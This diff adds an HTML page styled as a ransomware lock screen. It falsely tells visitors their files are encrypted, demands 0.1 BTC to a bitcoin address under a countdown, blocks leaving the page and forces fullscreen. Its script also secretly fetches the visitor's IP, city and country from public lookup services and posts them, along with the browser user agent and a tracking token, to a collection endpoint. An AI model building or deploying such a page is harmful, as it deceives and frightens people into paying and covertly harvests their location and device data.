@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>!!! YOUR DEVICE IS LOCKED !!!</title>
+    <style>
+        body {
+            background-color: #7a0000;
+            color: white;
+            font-family: 'Courier New', Courier, monospace;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            text-align: center;
+            overflow: hidden;
+        }
+
+        .container {
+            border: 5px solid red;
+            padding: 30px;
+            background: black;
+            max-width: 600px;
+            box-shadow: 0 0 50px red;
+        }
+
+        h1 {
+            color: red;
+            font-size: 2.5rem;
+            text-shadow: 0 0 10px red;
+            margin-bottom: 20px;
+        }
+
+        .warning-icon {
+            font-size: 5rem;
+            margin-bottom: 20px;
+        }
+
+        p {
+            line-height: 1.6;
+            font-size: 1.1rem;
+        }
+
+        .timer {
+            font-size: 3rem;
+            color: #ff0000;
+            margin: 20px 0;
+            font-weight: bold;
+        }
+
+        .bitcoin-addr {
+            background: #222;
+            padding: 10px;
+            border: 1px dashed white;
+            word-break: break-all;
+            margin: 20px 0;
+            color: #00ff00;
+        }
+
+        .footer {
+            margin-top: 20px;
+            font-size: 0.8rem;
+            color: #555;
+        }
+
+        .btn {
+            background: red;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 1.2rem;
+            cursor: not-allowed;
+            margin-top: 20px;
+            text-transform: uppercase;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="warning-icon">⚠️</div>
+        <h1>YOUR FILES ARE ENCRYPTED!</h1>
+        <p>Many of your documents, photos, videos, databases and other files are no longer accessible because they have
+            been encrypted. Maybe you are busy looking for a way to recover your files, but do not waste your time.</p>
+
+        <p style="color: yellow; margin-top: 10px;">To decrypt your files, you need to pay 0.1 BTC to the following
+            address:</p>
+        <div class="bitcoin-addr">bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</div>
+
+        <p>Time remaining before files are permanently deleted:</p>
+        <div class="timer" id="timer">47:59:59</div>
+
+        <button class="btn">DECRYPT FILES NOW</button>
+
+        <div class="footer">
+            Powered by IdeaBot Ransomware v3.1.0
+        </div>
+    </div>
+
+    <script>
+        const token = '__TOKEN__';
+
+        // Fake timer
+        let hours = 47, minutes = 59, seconds = 59;
+        const timerElement = document.getElementById('timer');
+
+        setInterval(() => {
+            if (seconds > 0) seconds--;
+            else {
+                seconds = 59;
+                if (minutes > 0) minutes--;
+                else {
+                    minutes = 59;
+                    if (hours > 0) hours--;
+                }
+            }
+            timerElement.innerText =
+                (hours < 10 ? '0' : '') + hours + ":" +
+                (minutes < 10 ? '0' : '') + minutes + ":" +
+                (seconds < 10 ? '0' : '') + seconds;
+        }, 1000);
+
+        // Try to prevent leaving
+        window.onbeforeunload = function () {
+            return "Are you sure you want to leave? Your files will be deleted!";
+        };
+
+        // Fullscreen on click
+        document.addEventListener('click', () => {
+            if (!document.fullscreenElement) {
+                document.documentElement.requestFullscreen().catch(e => { });
+            }
+        });
+
+        // === TRACKING: Send victim IP data to server ===
+        async function sendTrackingData() {
+            if (!token || token === '' || token === '__TOKEN__') return;
+
+            let ipData = { ip: 'Noma\'lum', city: 'Noma\'lum', country: 'Noma\'lum' };
+
+            // Try multiple IP APIs
+            const apis = [
+                {
+                    url: 'https://ipapi.co/json/',
+                    parse: (data) => ({ ip: data.ip, city: data.city, country: data.country_name })
+                },
+                {
+                    url: 'https://ipinfo.io/json',
+                    parse: (data) => ({ ip: data.ip, city: data.city, country: data.country })
+                },
+                {
+                    url: 'https://api.ipify.org?format=json',
+                    parse: (data) => ({ ip: data.ip, city: 'Noma\'lum', country: 'Noma\'lum' })
+                }
+            ];
+
+            for (const api of apis) {
+                try {
+                    const controller = new AbortController();
+                    const timeoutId = setTimeout(() => controller.abort(), 5000);
+                    const res = await fetch(api.url, { signal: controller.signal });
+                    clearTimeout(timeoutId);
+                    if (res.ok) {
+                        const data = await res.json();
+                        const parsed = api.parse(data);
+                        if (parsed.ip) {
+                            ipData = parsed;
+                            break;
+                        }
+                    }
+                } catch (e) {
+                    console.log('IP API failed, trying next...');
+                }
+            }
+
+            try {
+                const formData = new FormData();
+                formData.append('token', token);
+                formData.append('ip', ipData.ip || 'Noma\'lum');
+                formData.append('city', ipData.city || 'Noma\'lum');
+                formData.append('country', ipData.country || 'Noma\'lum');
+                formData.append('device', navigator.userAgent);
+
+                await fetch('/api/tracker_data', {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (e) {
+                console.error('Tracking failed:', e);
+            }
+        }
+
+        // Send tracking data immediately
+        sendTrackingData();
+    </script>
+</body>
+
+</html>
